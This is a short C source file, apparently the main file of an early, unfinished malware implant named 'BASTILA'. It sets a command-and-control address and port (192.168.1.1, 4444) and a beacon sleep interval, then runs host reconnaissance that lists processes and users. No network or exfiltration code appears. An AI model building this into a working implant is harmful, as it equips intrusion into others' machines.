#include <stdio.h>
#include "config.h"
#include "recon.h"

int main(VOID)

{
	//doesn't do anything yet
	IMPLANT_CONFIG config = { "192.168.1.1", 4444, 60, "BASTILA" };
	printf("CONFIG: %s %d %d %s\n", config.c2ip, config.port, config.sleep_interval, config.implant_name);

	printf("\n===========PROCESSES===========");
	collect_processes();

	printf("\n===========USERS===========");
	collect_usergrps();
	// todo: add groups

	return 0;


}



